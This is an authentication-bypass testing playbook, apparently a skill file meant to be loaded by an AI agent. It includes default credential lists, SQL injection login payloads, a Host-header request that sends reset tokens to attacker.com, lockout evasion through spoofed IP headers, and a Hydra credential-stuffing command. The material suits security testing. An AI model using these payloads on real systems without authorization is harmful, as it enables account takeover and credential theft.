---
name: authbypass-authentication-flaws
description: >-
  Authentication bypass testing playbook. Use when assessing login flows, password reset logic, account recovery, MFA bypass, token predictability, brute-force resistance, and session boundary flaws.
---

# SKILL: Authentication Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication bypass techniques. Covers SQL injection-based login bypass, password reset flaws, token predictability, account enumeration, brute force bypass, and multi-factor auth bypass. Distinct from JWT/OAuth (covered in ../jwt-oauth-token-attacks/SKILL.md). Focus on the login mechanism itself.

## 0. AUTHORIZED CREDENTIAL TEST PLANNING

After reducing routing entries, default credentials, username variants, port focus, and wordlist sizing are handled here in one place.

### Service-first tiny sets

| Service Type | First Usernames | First Passwords |
|---|---|---|
| phpMyAdmin | `root`, `admin` | empty, `root`, `phpmyadmin`, `admin` |
| FTP | `ftp`, `admin`, `test` | empty, `ftp`, `admin`, `123456` |
| SSH | `root`, `admin`, service account names | `root`, `admin`, seasonal variants |
| MySQL | `root`, `mysql` | empty, `root`, `mysql` |
| Tomcat / Java admin | `tomcat`, `admin`, `manager` | `tomcat`, `admin`, `s3cret` |
| WebLogic | `weblogic`, `admin` | `weblogic`, `welcome1`, `admin` |

### Username classes

| Class | Examples |
|---|---|
| Generic admins | `admin`, `administrator`, `root`, `test`, `guest` |
| Support / ops | `dev`, `ops`, `sysadmin`, `service`, `backup` |
| Name-based | `firstname`, `lastname`, `f.lastname`, `first.last` |
| Mail-derived | left side of corporate email formats |
| Product-based | `tomcat`, `weblogic`, `jenkins`, `gitlab` |

### Wordlist sizing and port focus

| Scenario | Preferred Size | Why |
|---|---|---|
| Default admin panel | 5 to 50 passwords | Defaults beat giant lists here |
| Internal service with known product | vendor-specific small set | Better signal than generic lists |
| Consumer login with weak controls | Top 20 or Top 100 | Fast verification |
| Rate-limited login | tiny list + header/rotation strategy | Preserve attempts |
| Offline hash cracking | large dictionaries | Online brute rules do not apply |

Prioritize common ports and service surfaces: 80/443/8080/8443 admin panels, 22 SSH, 21 FTP, and 3306/5432/6379/27017 data or management services.

---

## 1. SQL INJECTION LOGIN BYPASS

Classic but still found in legacy systems, custom ORMs, and raw query code:

```sql
-- Basic bypass (admin user assumed first row):
Username: admin'--
Password: anything
→ Query: SELECT * FROM users WHERE user='admin'--' AND pass='anything'

-- Generic bypass (logs in as first user in DB):
Username: ' OR '1'='1'--
Password: anything
→ Query: SELECT * FROM users WHERE user='' OR '1'='1'--' AND pass='anything'

-- Blind: does this work?
Username: ' OR 1=1--
Username: admin' OR 'a'='a
Username: 1' OR '1'='1'/*
Username: 1 or 1=1
```

**Test each field separately** — only one field may be vulnerable.

---

## 2. PASSWORD RESET VULNERABILITIES

### Guessable / Predictable Reset Tokens

Check if reset token is based on:
```
- Timestamp: token=1691234567890 (Unix time)
- Sequential: token=1001, 1002, 1003
- MD5(email): echo -n "user@example.com" | md5sum
- MD5(username+timestamp): reversible
- Short token (4-6 digits): brute-forceable
```

**Test**: Request 3 consecutive reset emails, compare token patterns.

### Reset Token Not Expiring
```
1. Request password reset → get token via email
2. Wait 48+ hours (token should expire)
3. Use old token → does it work?
```

### Reset Token Reuse
```
1. Request reset → get token T1
2. Complete reset with T1
3. Use T1 again → does it work again?
```

### Host Header Injection in Reset Email
When application generates reset URL using `Host` header:
```http
POST /forgot-password HTTP/1.1
Host: attacker.com           ← inject attacker's domain
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
→ Reset email sent to victim with link pointing to `attacker.com/reset?token=VICTIM_TOKEN`
→ Victim clicks → token captured by attacker

**Test**: Send password reset with modified `Host:`, check email for where reset link points.

### Password Reset Token in Referer
```
1. Request reset → go to reset URL with token
2. Reset page loads third-party resources (analytics, fonts)
→ Referer header leaks: https://target.com/reset?token=TOKEN
→ Third-party server receives token in logs
```

### Password Change Without Current Password
```
PUT /api/user/password
{"new_password": "hacked"}
→ No current_password field required?
→ Combine with CSRF for account takeover
```

---

## 3. ACCOUNT ENUMERATION

Identifying valid usernames/emails enables targeted attacks:

### Error Message Difference
```
Invalid username → "User not found"
Valid username, wrong pass → "Incorrect password"
→ Enumerate valid accounts
```

### Response Time Difference
```
Invalid username → fast response (no DB lookup)
Valid username → slightly slower (DB lookup + hash comparison)
→ Timing oracle
```

### Password Reset Flow
```
POST /forgot-password {"email": "nonexistent@example.com"}
→ "If this email exists, we sent a reset link" (proper)
vs.
→ "This email is not registered" (enumeration possible)
```

### Registration Endpoint
```
POST /register {"email": "victim@example.com"}
→ "Email already registered" → confirms account exists
vs.
→ "Verification email sent" for both → no enumeration
```

---

## 4. BRUTE FORCE BYPASS

### Lockout After N Attempts Then Resets
```
Lockout at 10 attempts → try 9 wrong passwords → lock
Wait for reset period (usually 30 min or 1 hour)
→ Try 9 more → repeat → no permanent lockout
```

### IP-Based Lockout Bypass
```
X-Forwarded-For: 1.1.1.1       ← change each request
X-Real-IP: 2.2.2.2
Rotate through IPs in header
```

### Username Cycling vs Password Cycling
```
Normal brute: try many passwords for one user → lock
Reverse brute: try ONE password for many users
→ "password123" against all users → find those with weak password
→ No single account locked out
```

### Credential Stuffing
Use breached credentials from HaveIBeenPwned datasets against target:
```bash
# Tools: Hydra, Burp Intruder, custom scripts
hydra -C credentials.txt https-post-form://target.com/login:"username=^USER^&password=^PASS^":"error message"
```

---

## 5. MULTI-FACTOR AUTHENTICATION BYPASS

### Session Cookie Before 2FA Completion
```
Flow: Login (password correct) → redirect to 2FA page → enter code
Attack: After password step, session cookie is set but 2FA not yet checked.
→ Use session cookie to directly access /dashboard
→ Skip 2FA page entirely
```

### 2FA Code Brute Force
```
4-6 digit TOTP codes = 1,000,000 possibilities max
If no lockout on 2FA step:
→ Brute force all codes (tool: Burp Intruder, sequential)
→ TOTP windows: 30-second window, some accept previous/next window
```

### 2FA on Critical Actions Not On Login
```
Login doesn't require 2FA, but:
DELETE /account or POST /transfer requires 2FA
Attack: Is 2FA checked on those actions or only on login?
→ If only login: log in once → no 2FA needing verification for actions
```

### 2FA Backup Code Abuse
```
Generate backup codes (usually 8-10 single-use)
Test: 
→ Are backup codes rate-limited?
→ Can backup codes be used multiple times?
→ Short codes (6-8 chars)? Brute-force if no rate limit
```

### 2FA Code Reuse
```
TOTP codes valid for one use
→ Use same TOTP code twice → does second use work?
→ Replay attack if server doesn't track used codes
```

---

## 6. OAUTH / SSO ACCOUNT TAKEOVER PATTERNS

### Email Claim Trust
```
1. Create account at attacker-controlled OAuth provider
2. Set email claim = victim@target.com
3. Link/login via that provider
→ If server trusts email claim without verification → account merge/takeover
```

### Password Doesn't Apply After SSO Link
```
1. User links Google SSO
2. User forgets password (account has no password set after SSO only)
3. "Forgot Password" flow → resets password even for SSO-only accounts?  
→ Can set password → now bypass SSO → direct login
```

---

## 7. USERNAME / PASSWORD FIELD MANIPULATION

### Long Password DoS → Bypass
```
Some apps hash passwords before sending to database.
bcrypt has 72-byte limit — input beyond 72 bytes is ignored.
Attack: 
→ Register with password "A"*100
→ Login with password "A"*72 → same hash → works
→ Login with "A"*71 + "totally different" → if truncation → same hash if first 72 chars match
```

### Null Byte in Username
```
username=admin%00 vs username=admin
→ Null byte truncation in some string comparisons
→ "admin\0attacker" = "admin" in C-string comparison
```

### Unicode Normalization
```
Username: "ⓢcott" → normalizes to "scott" → impersonates "scott"
Username: "admin" (various Unicode homoglyphs for letters a,d,m,i,n)
```

---

## 8. SESSION MANAGEMENT FLAWS

### Session Not Invalidated on Logout
```
1. Log in → capture session cookie
2. Log out
3. Replay captured session cookie → still valid?
→ Session not server-side invalidated
```

### Session Not Regenerated on Privilege Change
```
1. Log in as low priv → get session cookie
2. Admin upgrades your role
3. Old session cookie now has admin access?
→ Session not regenerated → old token inherits new privileges
```

### Predictable Session Tokens
```
Token: base64(userid+timestamp) → reversible
Token: sequential integers → session ID= your_session_id -/+ small number
Token: short random (32-bit entropy) → brute-forceable
```

---

## 9. AUTHENTICATION TESTING CHECKLIST

```
□ Try SQL injection on login fields (' OR 1=1--)
□ Test password reset: predict token, host header injection, Referer leak
□ Test account enumeration via error messages / timing
□ Check 2FA: skip step (direct URL), brute force codes, reuse codes
□ Test brute force protections: X-Forwarded-For bypass, reverse brute
□ Check session invalidation on logout
□ Check session regeneration after privilege change
□ Test password change requiring current password  
□ Test long passwords (bcrypt 72-byte truncation)
□ OAuth/SSO: test email claim trust, password set after SSO
□ Check remember_me tokens: how long, revocable, predictable?
```

---

## 10. PASSWORD RESET ATTACK MATRIX (22 Patterns)

| # | Pattern | Description |
|---|---|---|
| 1 | Predictable reset token | Token based on timestamp, user ID, or sequential number |
| 2 | Token not bound to user | Use token generated for user A to reset user B |
| 3 | Token in response body | Reset token returned in HTTP response (not just email) |
| 4 | Token in URL parameter | Reset link token visible in Referer header to external resources |
| 5 | No token expiration | Token remains valid indefinitely |
| 6 | Token reuse | Same token works multiple times |
| 7 | Short/brute-forceable token | 4-6 digit numeric code without rate limiting |
| 8 | Password reset via host header | `Host: attacker.com` → reset link sent with attacker's domain |
| 9 | Registration overwrites existing account | Register with same email → overwrites password |
| 10 | Step skip (frontend only) | Jump directly to "set new password" step via URL |
| 11 | Response manipulation | Change `{"status":"fail"}` to `{"status":"success"}` in proxy |
| 12 | Verification code in response | SMS/email code returned in API response |
| 13 | Parallel session reset | Start reset for A, complete with B's session |
| 14 | Email/phone parameter pollution | `email=victim@x.com&email=attacker@x.com` |
| 15 | Unicode normalization | `admin@target.com` vs `ADMIN@target.com` vs Unicode confusables |
| 16 | SQL injection in reset | Email field injectable in reset query |
| 17 | IDOR on reset endpoint | Change user ID in reset confirmation request |
| 18 | Cross-protocol reset | Mobile API doesn't validate same token as web |
| 19 | Default security questions | Guessable answers, no rate limit |
| 20 | Token generation race condition | Multiple simultaneous requests generate same token |
| 21 | Logout doesn't invalidate reset | After password change, old sessions still work |
| 22 | Reset link cached by CDN/proxy | Public cache stores reset link with token |

---

## 11. CAPTCHA/VERIFICATION BYPASS PATTERNS (20 Methods)

| # | Method | How |
|---|---|---|
| 1 | Remove captcha parameter | Delete captcha field from request |
| 2 | Send empty captcha | `captcha=` or `captcha=null` |
| 3 | Reuse previous captcha | Same captcha value works multiple times |
| 4 | Captcha not bound to session | Use captcha solved in session A for session B |
| 5 | Server-side validation missing | Captcha checked client-side only |
| 6 | Response manipulation | Intercept and change response to bypass |
| 7 | Change request method | POST→GET or vice versa may skip captcha check |
| 8 | JSON content-type | Switch from form to JSON — captcha handler may not process |
| 9 | OCR bypass | Simple captchas solvable with tesseract/ML |
| 10 | Audio captcha weakness | Audio often simpler than visual |
| 11 | SMS code in response | Verification code returned in API response body |
| 12 | SMS code predictable | Sequential or time-based codes |
| 13 | No rate limit on code verification | Brute-force 4-6 digit code |
| 14 | Code not bound to phone/email | Use code sent to phone A on account B |
| 15 | Code doesn't expire | Old codes remain valid |
| 16 | Null byte in phone number | `+1234567890%00` bypasses dedup but delivers to same number |
| 17 | Case sensitivity | Email: `Admin@X.com` vs `admin@x.com` |
| 18 | Space/encoding in identifier | `user@x.com` vs `user@x.com ` (trailing space) |
| 19 | Concurrent requests | Race condition: send verify before captcha loads |
| 20 | Third-party captcha bypass | Misconfigured reCAPTCHA site key allows any domain |

---

## 12. INSECURE RANDOMNESS — TOKEN PREDICTION

### UUID v1 (Time-Based — Predictable!)

```
UUID v1 format: timestamp-clock_seq-node(MAC)
# MAC address often leaked via other endpoints
# Timestamp is 100ns intervals since 1582-10-15
# Tool: guidtool (reconstruct possible UUIDs from known timestamp range)
```

### MongoDB ObjectId

```
ObjectId = 4-byte timestamp + 5-byte random + 3-byte counter
# First 4 bytes = Unix timestamp → creation time leaked
# Counter is sequential → adjacent ObjectIds predictable
# If you know one ObjectId, nearby ones are calculable
```

### PHP uniqid()

```php
uniqid() = hex(microtime)
// Output: 5f3e7a4c1d2b3
// Entirely based on current microsecond timestamp
// Predictable if you know approximate server time
```

### PHP mt_rand() Recovery

```
# mt_rand() uses Mersenne Twister PRNG
# After observing ~624 outputs, full internal state is recoverable
# Tool: openwall/php_mt_seed
# Feed known outputs → recover seed → predict all future values
```

### Tools

- `guidtool` — UUID v1 reconstruction
- `AethliosIK/reset-tolkien` — Automated token prediction for password resets
- `openwall/php_mt_seed` — PHP mt_rand seed recovery
- `sandwich` — Token timestamp analysis
